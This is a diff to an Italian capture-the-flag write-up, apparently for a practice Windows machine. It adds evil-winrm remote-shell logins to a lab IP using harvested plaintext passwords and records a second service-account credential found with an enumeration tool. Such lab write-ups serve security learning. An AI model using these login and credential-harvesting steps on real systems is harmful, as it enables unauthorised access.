@@ -65,7 +65,16 @@ Thestrokes23
 ```
 
 Quindi mi collego alla macchina con:
-
+```
 evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+```
 
 e prelevo il primo flag! 
+
+Con winenum trovo:
+
+EGOTISTICALBANK   EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!
+
+Quindi:
+
+sudo evil-winrm -u svc_loanmanager -p Moneymakestheworldgoround! -i 10.10.10.175
